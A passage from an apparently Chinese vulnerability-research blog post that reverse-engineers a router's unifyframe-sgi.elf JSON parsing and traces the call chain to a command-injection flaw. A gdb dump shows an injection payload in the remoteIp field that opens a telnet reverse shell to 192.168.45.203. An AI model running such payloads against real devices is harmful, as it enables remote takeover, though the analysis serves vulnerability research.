<h4 id="为什么最新版不能再走这条链了？"><a href="#为什么最新版不能再走这条链了？" class="headerlink" title="为什么最新版不能再走这条链了？"></a>为什么最新版不能再走这条链了？</h4><p>在 <code>219</code> 版本，在 <code>noauth.lua</code> 文件中的 <code>merge</code> 函数，加入了对 <code>params</code> 中危险字符的过滤，调用了 <code>includeXxs</code> 和 <code>includeQuote</code> 函数，对换行符、回车符、反引号、<code>&amp;</code>、<code>$</code>、<code>;</code>、<code>|</code> 等符号都做了过滤，这就意味着后续无法再进行命令注入了。而 <code>219</code> 版本只在这里进行了危险字符的过滤，只要从其他地方调用到诸如 <code>dev_cap</code> <code>dev_sta</code> 表中的函数依然可以进行命令注入</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span>(<span class="string">&quot;luci.utils.tool&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> _strParams = luci.json.encode(params)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tool.includeXxs(_strParams) <span class="keyword">or</span> tool.includeQuote(_strParams) <span class="keyword">then</span></span><br><span class="line">        tool.eweblog(_strParams, <span class="string">&quot;MERGE FAILED INVALID DATA&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;INVALID DATA&#x27;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;</span><br><span class="line">        device = <span class="string">&quot;pc&quot;</span>,</span><br><span class="line">        <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>,</span><br><span class="line">        data = params,</span><br><span class="line">        async = <span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">includeXxs</span><span class="params">(str)</span></span></span><br><span class="line">    <span class="keyword">local</span> ngstr = <span class="string">&quot;[\n\r`&amp;$;|]&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">match</span>(str, ngstr) ~= <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">includeQuote</span><span class="params">(str)</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">match</span>(str, <span class="string">&quot;([&#x27;])&quot;</span>) ~= <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h3 id="漏洞文件分析"><a href="#漏洞文件分析" class="headerlink" title="漏洞文件分析"></a>漏洞文件分析</h3><p>下面开始分析 <code>/usr/sbin/unifyframe-sgi.elf</code> 文件，整体流程是在 <code>main</code> 函数调用了三个关键函数 <code>uf_socket_msg_read</code> <code>parse_content</code> <code>add_pkg_cmd2_task</code> ，他们的作用分别为 <strong>接收数据 解析数据 执行命令</strong></p>
<h4 id="字段解析"><a href="#字段解析" class="headerlink" title="字段解析"></a>字段解析</h4><p>由 <code>uf_socket_msg_read</code> 函数将 <code>json</code> 数据读入到内存中，地址为 <code>v31+1</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//uf_socket_msg_read</span></span><br><span class="line"></span><br><span class="line">  v31 = (_DWORD *)malloc_pkg();</span><br><span class="line">......</span><br><span class="line">  pthread_mutex_lock(v29 + <span class="number">5</span>);</span><br><span class="line">  *v31 = v29;</span><br><span class="line">  v52 = uf_socket_msg_read(*v29, v31 + <span class="number">1</span>);</span><br><span class="line">  pthread_mutex_unlock(v29 + <span class="number">5</span>);</span><br></pre></td></tr></table></figure>

<p>通过 <code>gdb</code> 来查看读入的数据  <strong>这里只为说明 <code>gdb</code> 可以查看内存中读入的数据，文章前后发送的报文并不一样</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/4s 0x623850</span><br><span class="line">0x623850:	&quot;&#123; \&quot;method\&quot;: \&quot;devConfig.get\&quot;, \&quot;params\&quot;: &#123; \&quot;module\&quot;: \&quot;123\&quot;, \&quot;remoteIp\&quot;: \&quot;$(mkfifo \\/tmp\\/test;telnet 192.168.45.203 6666 0&lt;\\/tmp\\/test|\\/bin\\/sh &gt; \\/tmp\\/test)\&quot;, \&quot;remotePwd\&quot;: \&quot;\&quot;, \&quot;async\&quot;: true, \&quot;data\&quot;: &quot;...</span><br><span class="line">0x623918:	&quot;\&quot;&#123;\\\&quot;kkk\\\&quot;:\\\&quot;abc\\\&quot;&#125;\&quot; &#125; &#125;&quot;</span><br></pre></td></tr></table></figure>



<p><code>json</code> 数据的各字段进行解析在 <code>parse_content</code> 函数中完成，该函数首先判断了 <code>params</code> 和 <code>method</code> 字段是否存在，然后在 <code>method</code> 字段不为 <code>cmdArr</code> 的情况下，调用 <code>parse_obj2_cmd</code> 函数进一步对字段进行解析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//parse_content </span></span><br><span class="line">  v3 = json_tokener_parse();</span><br><span class="line">  v4 = v3;</span><br><span class="line">......</span><br><span class="line">  v6 = json_object_object_get_ex(v3, <span class="string">&quot;params&quot;</span>, &amp;v18);</span><br><span class="line">  v7 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">1</span> )<span class="comment">//检查了 params 字段是否存在值</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_27:</span><br><span class="line">    json_object_put(v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v4, <span class="string">&quot;method&quot;</span>, v19) != <span class="number">1</span> )<span class="comment">//检查了 method 字段是否存在值</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_26:</span><br><span class="line">    v7 = v4;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = json_object_get_string(v19[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v8, <span class="string">&quot;cmdArr&quot;</span>) )<span class="comment">//因为发送的 method 字段不为 cmdArr，所以进入 else</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">    v16 = parse_obj2_cmd(v4); <span class="comment">//进行数据解析的具体位置,v4为Json对象                  </span></span><br><span class="line">    *v15 = v16;</span><br><span class="line">    <span class="keyword">if</span> ( !v16 )</span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    pkg_add_cmd(a1, v15);</span><br><span class="line">    v15[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<p><code>parse_obj2_cmd</code> 函数中具体的解析了各个字段及类型并把它们记录到一个堆块中，最终返回该堆块地址，便于之后的访问。<strong>想知道 <code>POC</code> 的编写格式就要对此处进行逆向分析</strong>，具体分析结果已写在注释中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//parse_obj2_cmd</span></span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x34</span>);<span class="comment">//创建了一个堆块，用于记录和存储接下来的各种信息，该函数最终会返回这个堆块地址</span></span><br><span class="line">  v3 = v2;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(a1, <span class="string">&quot;params&quot;</span>, &amp;v38) != <span class="number">1</span> )<span class="comment">//判断params字段是否存在，存在的话将值赋给v38</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(a1, <span class="string">&quot;method&quot;</span>, &amp;v37) != <span class="number">1</span> )<span class="comment">//判断method字段是否存在，存在的话将值赋给v37</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = json_object_get_string(v37);<span class="comment">//获取到method的值，下面去匹配对应的操作，各种操作都对应一个数字，该数字放在了堆块的第一个指针处</span></span><br><span class="line">  v5 = v4;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v4, <span class="string">&quot;devSta&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v5, <span class="string">&quot;acConfig&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)v3 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v5, <span class="string">&quot;devConfig&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)v3 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v5, <span class="string">&quot;devCap&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v5, <span class="string">&quot;ufSys&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_log_printf(uf_log, (<span class="type">const</span> <span class="type">char</span> *)dword_4219EC, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">274</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">      &#125;</span><br><span class="line">      v6 = <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)v3 = v6;</span><br><span class="line">LABEL_21:</span><br><span class="line">  v7 = <span class="built_in">strchr</span>(v5, <span class="number">46</span>);<span class="comment">//此处的strchr与strdup函数配合将method字段中xxx.xxx的字符串进行了分割，假设最初method为devConfig.get，那么此处会将get放入堆块中的第二个指针处</span></span><br><span class="line">  v8 = strdup(v7 + <span class="number">1</span>);</span><br><span class="line">  *(_DWORD *)(v3 + <span class="number">4</span>) = v8;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;module&quot;</span>, &amp;v37) != <span class="number">1</span> )<span class="comment">//判断params字段中是否存在module这个值，存在的话将module的值放入v37中，不存在直接返回</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = json_object_get_string(v37);</span><br><span class="line">  <span class="keyword">if</span> ( !v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_client_log, <span class="string">&quot;(%s %s %d)obj_module is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">294</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = strdup(v10);</span><br><span class="line">  *(_DWORD *)(v3 + <span class="number">8</span>) = v11;<span class="comment">//将module字段的值放到堆块的第三个指针中</span></span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;remoteIp&quot;</span>, &amp;v37) == <span class="number">1</span> &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(v37) - <span class="number">5</span>) &lt; <span class="number">2</span> )<span class="comment">//这里判断params字段中remoteIp是否存在，存在的话将remoteIp的值赋给v37，同时对remoteIp值的类型做了检查，这里其实就要它的类型为string</span></span><br><span class="line">  &#123;</span><br><span class="line">    v12 = json_object_get_string(v37);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = strdup(v12);</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">20</span>) = v13;<span class="comment">//将remoteIp的值放入堆块的第六个指针中</span></span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;remotePwd&quot;</span>, &amp;v37) == <span class="number">1</span> &amp;&amp; json_object_get_type(v37) == <span class="number">5</span> )<span class="comment">//作用同上类似，这里要求remotePwd的类型为array，但是如果传入array类型的话，前端做了相应的检查导致异常，因此猜测这里应该是写的Bug</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = json_object_get_string(v37);</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = strdup(v14);</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">24</span>) = v15;</span><br><span class="line">......  </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = *(_DWORD *)v3 != <span class="number">2</span>;</span><br><span class="line">  *(_BYTE *)(v3 + <span class="number">40</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_BYTE *)(v3 + <span class="number">41</span>) = v16;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;async&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v18 = v17;</span><br><span class="line">    <span class="keyword">if</span> ( v17 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v17 == <span class="number">48</span> || !<span class="built_in">strcmp</span>(v17, <span class="string">&quot;false&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">41</span>) = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *v18 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v18, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_WORD *)(v3 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v18);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;force&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v20 = v19;</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v19 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v19, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">43</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v20);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;configId_not_change&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v22 = v21;</span><br><span class="line">    <span class="keyword">if</span> ( v21 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v21 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v21, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">44</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v22);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;from_url&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v23 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v24 = v23;</span><br><span class="line">    <span class="keyword">if</span> ( v23 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v23 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v23, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">45</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v24);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;from_file&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v26 = v25;</span><br><span class="line">    <span class="keyword">if</span> ( v25 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v25 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v25, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">47</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v26);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;multi&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v28 = v27;</span><br><span class="line">    <span class="keyword">if</span> ( v27 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v27 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v27, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">48</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v28);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;not_commit&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v29 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v30 = v29;</span><br><span class="line">    <span class="keyword">if</span> ( v29 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v29 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v29, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">46</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v30);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;execute&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v31 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v32 = v31;</span><br><span class="line">    <span class="keyword">if</span> ( v31 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v31 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v31, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">42</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v32);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v33 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;data&quot;</span>, &amp;v37) == <span class="number">1</span> &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(v37) - <span class="number">4</span>) &lt; <span class="number">3</span> )<span class="comment">//判断params字段中是否存在data，如果存在的话将其赋值给v37，并且检查了data的值类型，只能为object,array,string三种类型，然后将data的值放到堆块的第四个指针处</span></span><br><span class="line">  &#123;</span><br><span class="line">    v34 = json_object_get_string(v37);</span><br><span class="line">    <span class="keyword">if</span> ( v34 )</span><br><span class="line">    &#123;</span><br><span class="line">      v35 = strdup(v34);</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">12</span>) = v35;</span><br><span class="line">      <span class="keyword">if</span> ( !v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">470</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_108;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v33;<span class="comment">//返回堆块地址</span></span><br></pre></td></tr></table></figure>

<p>将这个堆块装的各种数据绘制成图片可能更直观一些（如下）  <code>xxx</code> 代表有些保留字段，或者是一些标志位，它们在后续利用过程中并不重要，暂不详细记录</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651606.png" alt="image-20230816171132162" style="zoom:50%;" />





<p>使用 <code>GDB</code> 调试到此处看到的各字段信息如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651092.png" alt="image-20230816171530830"></p>
<p><code>parse_obj2_cmd</code> 函数结束后，会执行 <code>pkg_add_cmd(a1, v15)</code> ，它的核心作用就是在 <code>a1</code> 这个数据结构中记录了 <code>v15</code> 的指针，使得后续操作通过 <code>a1</code> 访问到刚刚解析出来的各个字段。不过这 <code>pkg_add_cmd</code> 函数里有一个谜之操作，在这行代码中 <code>*(_DWORD *)(a1 + 92) = a2 + 13</code> 是把 <code>a2</code> 也就是 <code>v15</code> 的值加上了 <code>13</code> 存储到了 <code>a1</code> 中，而通过后续的分析得知，之后访问这个 <code>v15</code> 的堆块是通过 <code>*(a1+92)-13</code> 得到的地址。存的时候 <code>+13</code> ，访问的时候 <code>-13</code> ，这里没太理解但并不影响我们后续的分析</p>
<h4 id="触发漏洞的调用链分析"><a href="#触发漏洞的调用链分析" class="headerlink" title="触发漏洞的调用链分析"></a>触发漏洞的调用链分析</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main ==&gt; add_pkg_cmd2_task ==&gt; uf_cmd_call ==&gt; ufm_handle ==&gt; remote_call ==&gt;sub_41A148</span><br></pre></td></tr></table></figure>

<p><code>json</code> 数据解析完成后，会调用 <code>add_pkg_cmd2_task</code> ，该函数通过访问之前解析出的各个字段，判断 <code>method</code> 是不是 <code>devCap</code> ，如果是的话可以调用后续的漏洞函数（不是 <code>devCap</code> 也可以触发漏洞但是调用链走的并不是我分析的这条）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//add_pkg_cmd2_task</span></span><br><span class="line">  <span class="keyword">if</span> ( dword_43897C &lt; <span class="number">1001</span> )<span class="comment">//这里正常就可以进入</span></span><br><span class="line">  &#123;</span><br><span class="line">    pthread_mutex_lock(*a1 + <span class="number">20</span>);</span><br><span class="line">    v3 = (_DWORD *)a1[<span class="number">22</span>];<span class="comment">//这个a1[22]也就是上面提到的*(a1+92)</span></span><br><span class="line">    v4 = v3 - <span class="number">13</span>;<span class="comment">//当时存地址时加了13，这里又减了13，所以v4就是上面记录了解析json各字段的那个堆块地址</span></span><br><span class="line">    <span class="keyword">for</span> ( i = *v3 - <span class="number">52</span>; ; i = *(_DWORD *)(i + <span class="number">52</span>) - <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 + <span class="number">13</span> == a1 + <span class="number">22</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        pthread_mutex_unlock(*a1 + <span class="number">20</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v6 = <span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line">      v7 = (<span class="type">int</span> **)v6;</span><br><span class="line">......</span><br><span class="line">      v10 = (<span class="type">int</span> *)(v6 + <span class="number">4</span>);</span><br><span class="line">      v7[<span class="number">2</span>] = v10;</span><br><span class="line">      v7[<span class="number">1</span>] = v10;</span><br><span class="line">      *v7 = v4;</span><br><span class="line">      v7[<span class="number">4</span>] = (<span class="type">int</span> *)(v7 + <span class="number">3</span>);</span><br><span class="line">      v7[<span class="number">3</span>] = (<span class="type">int</span> *)(v7 + <span class="number">3</span>);</span><br><span class="line">......   </span><br><span class="line">      *v7 = v4;</span><br><span class="line">      v11 = (_DWORD *)*v4;</span><br><span class="line">      v12 = *(_DWORD *)*v4;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">3</span> )<span class="comment">//触发uf_cmd_call函数的关键就是method值的操作类型要为devCap,才能执行break跳出循环，调用uf_cmd_call函数（method为devConfig.get时，依然可以完成攻击，不过走的就是其他链了）</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        gettimeofday(v4 + <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">        uf_sys_handle(**v7, v4 + <span class="number">1</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">        gettimeofday(v4 + <span class="number">7</span>, <span class="number">0</span>);</span><br><span class="line">        sub_40B404(v7);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">2</span> &amp;&amp; !<span class="built_in">strcmp</span>(v11[<span class="number">1</span>], <span class="string">&quot;get&quot;</span>) &amp;&amp; !v11[<span class="number">9</span>] &amp;&amp; uf_cmd_buf_exist_check(v11[<span class="number">2</span>], <span class="number">2</span>, v11[<span class="number">3</span>], v4 + <span class="number">1</span>) )<span class="comment">//这个v12也就是解析的Operation type值</span></span><br><span class="line">      &#123;</span><br><span class="line">......</span><br><span class="line">      &#125;</span><br><span class="line">      sub_40B0C4(v7);</span><br><span class="line">LABEL_23:</span><br><span class="line">      v4 = (<span class="type">int</span> *)i;</span><br><span class="line">    &#125;</span><br><span class="line">    gettimeofday(v4 + <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( uf_cmd_call(*v4, v4 + <span class="number">1</span>) )<span class="comment">//后续的漏洞触发是在这个函数中            </span></span><br><span class="line">      v13 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v13 = <span class="number">1</span>;</span><br><span class="line">    v4[<span class="number">12</span>] = v13;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br></pre></td></tr></table></figure>



<p><code>uf_cmd_call</code> 函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//uf_cmd_call  </span></span><br><span class="line">  v2 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 || (v3 = *(_DWORD *)a1, *(_DWORD *)a1 &gt;= <span class="number">6u</span>) || (v4 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">8</span>)) == <span class="number">0</span> )<span class="comment">//这里检查了operator是否为空，Operation type的合法性检查以及module_value是否存在，在我们发送的报文中是不会进入这个if的</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(v103, <span class="number">0</span>, <span class="number">108</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">3</span> )<span class="comment">//因为操作类型设置为devCap，所以这个if可以进来</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">    v5 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">20</span>);<span class="comment">//这里取了remoteIp字段</span></span><br><span class="line">    <span class="keyword">if</span> ( !v5 || !*v5 )<span class="comment">//判断remoteIp字段是否存在</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_250;</span><br><span class="line">    v6 = a1;</span><br><span class="line">    <span class="keyword">if</span> ( !is_self_ip(*(_DWORD *)(v6 + <span class="number">20</span>)) )<span class="comment">//is_self_ip函数正常情况下返回的是0，这个if可以进入</span></span><br><span class="line">    &#123;</span><br><span class="line">      remote_call((<span class="type">int</span> *)a1, (<span class="type">const</span> <span class="type">char</span> **)a2);<span class="comment">//后续的漏洞触发是在这个函数中   </span></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<p><code>remote_call</code> 函数</p>
